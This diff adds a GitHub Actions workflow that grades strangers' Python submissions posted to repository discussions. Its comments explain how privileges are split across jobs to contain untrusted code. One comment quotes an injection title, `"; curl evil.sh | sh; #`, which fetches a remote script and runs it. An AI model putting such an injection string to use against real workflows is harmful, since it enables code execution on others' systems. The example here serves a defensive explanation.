@@ -1,0 +1,170 @@
+# The L.A.B. Simulator, run from a discussion thread.
+#
+# Somebody posts a unit in the simulator category; a bot grades it and replies with the named
+# checks that failed. `/check`, `/hint`, `/solution` and `/status` work as comments. Nobody needs
+# to clone anything, which matters more than it sounds: most people who ever open this repository
+# will not clone it, and a thread where a wrong answer was posted, caught by a named check,
+# explained by a peer and fixed is worth more to the next reader than a green tick on a fork.
+#
+# ── The part that needs care ────────────────────────────────────────────────────────────────
+#
+# This executes code written by strangers, triggered by an event in the *base* repository, which
+# is the same hazard as `pull_request_target`. The structure is the mitigation:
+#
+#   route    reads the event. No code execution. Decides whether anything should happen at all.
+#   grade    runs the stranger's Python — with `permissions: {}`, no secrets, no persisted git
+#            credentials, and a hard timeout. This job cannot write to the repository, cannot
+#            read a secret, and holds no token to steal. That is the actual defence.
+#   respond  holds `discussions: write` and runs no untrusted code. It posts the artifact the
+#            grade job produced, after sanitising it — see scripts/discussion_bot.py.
+#
+# Untrusted content is never interpolated into a shell. The event payload is already on the
+# runner at $GITHUB_EVENT_PATH and is passed by *path*; `${{ github.event.discussion.body }}`
+# does not appear anywhere below, and should not be added.
+#
+# Residual risk, stated rather than hidden: a submission can burn runner minutes up to the
+# timeout, and can make the grade job emit misleading text that the bot then posts under the
+# repository's identity. The sanitiser strips mentions and foreign HTML comments; it does not
+# make the text trustworthy. On a public teaching repository that trade is worth making, and it
+# is reversible — disable this workflow and the CLI path is unaffected.
+name: L.A.B. Simulator · discussions
+
+on:
+  discussion:
+    types: [created, edited]
+  discussion_comment:
+    types: [created]
+
+concurrency:
+  group: labsim-discussion-${{ github.event.discussion.number }}
+  cancel-in-progress: true
+
+permissions: {}
+
+jobs:
+  route:
+    name: Should anything happen
+    runs-on: ubuntu-latest
+    permissions: {}
+    outputs:
+      proceed: ${{ steps.decide.outputs.proceed }}
+      mode: ${{ steps.decide.outputs.mode }}
+    steps:
+      - id: decide
+        env:
+          # Category name is repository metadata, not user input — but it still goes through
+          # the environment rather than into the script body, because that is the habit that
+          # keeps the one that matters safe.
+          CATEGORY: ${{ github.event.discussion.category.name }}
+          IS_BOT: ${{ github.event.comment.user.type == 'Bot' || github.actor == 'github-actions[bot]' }}
+          HAS_COMMENT: ${{ github.event_name == 'discussion_comment' }}
+          COMMENT_BODY_LEN: ${{ github.event.comment.body != null && 1 || 0 }}
+        run: |
+          set -euo pipefail
+          proceed=false
+          mode=grade
+
+          # Tolerant on the category name, because the one manual step in setting this up is
+          # creating it by hand and people type what they remember. Anything that normalises to
+          # "labsimulator" counts.
+          normalised=$(printf '%s' "$CATEGORY" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z')
+          case "$normalised" in
+            labsimulator|labsimulatorexercises|exercisessubmissions) proceed=true ;;
+          esac
+
+          # Never react to our own comment. Without this, posting a reply that happens to
+          # contain "/check" would trigger a run that posts a reply, forever.
+          if [ "$IS_BOT" = "true" ]; then proceed=false; fi
+          if [ "$HAS_COMMENT" = "true" ]; then mode=command; fi
+
+          echo "proceed=$proceed" >> "$GITHUB_OUTPUT"
+          echo "mode=$mode"       >> "$GITHUB_OUTPUT"
+          echo "category='$CATEGORY' -> proceed=$proceed mode=$mode"
+
+  grade:
+    name: Run it (no token, no secrets)
+    needs: route
+    if: needs.route.outputs.proceed == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    permissions: {}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false      # nothing here should be able to push
+          ref: main                       # grade against the units on main, not a fork's copy
+
+      - uses: actions/setup-python@v5
+        with: { python-version: "3.11", cache: pip }
+      - run: pip install -e ".[dev]"
+
+      - name: Grade the submission or run the command
+        working-directory: lab-simulator
+        env:
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          # The event payload is on disk already. Passing the path rather than the body is what
+          # keeps a discussion title of `"; curl evil.sh | sh; #` inert.
+          python -m labsim discuss \
+            --event "$GITHUB_EVENT_PATH" \
+            --out "$RUNNER_TEMP/reply.md" \
+            --meta "$RUNNER_TEMP/meta.json" \
+            --repo "$REPO"
+
+      - name: Collect the reply
+        run: |
+          mkdir -p out
+          cp "$RUNNER_TEMP/reply.md" out/reply.md
+          cp "$RUNNER_TEMP/meta.json" out/meta.json
+          echo "--- reply ---"; head -c 2000 out/reply.md
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: labsim-reply-${{ github.event.discussion.number }}-${{ github.run_attempt }}
+          path: out/
+          retention-days: 3
+
+  respond:
+    name: Post the reply
+    needs: [route, grade]
+    if: needs.route.outputs.proceed == 'true'
+    runs-on: ubuntu-latest
+    permissions:
+      discussions: write
+    steps:
+      - uses: actions/checkout@v4
+        with: { persist-credentials: false }
+      - uses: actions/setup-python@v5
+        with: { python-version: "3.11" }
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: labsim-reply-${{ github.event.discussion.number }}-${{ github.run_attempt }}
+          path: out
+
+      - name: Decide how to post
+        id: how
+        run: |
+          set -euo pipefail
+          action=$(python -c "import json;print(json.load(open('out/meta.json'))['action'])")
+          # A grade is a verdict: one per thread, edited in place. A hint is a conversation and
+          # accumulates, because which hints somebody needed is the useful record.
+          case "$action" in
+            grade|check) mode=grade ;;
+            *)           mode=append ;;
+          esac
+          echo "mode=$mode" >> "$GITHUB_OUTPUT"
+          echo "action=$action mode=$mode"
+
+      - name: Comment on the discussion
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NODE_ID: ${{ github.event.discussion.node_id }}
+        run: |
+          set -euo pipefail
+          [ -s out/reply.md ] || { echo "empty reply, nothing to post"; exit 0; }
+          python scripts/discussion_bot.py \
+            --node-id "$NODE_ID" \
+            --body-file out/reply.md \
+            --mode "${{ steps.how.outputs.mode }}"
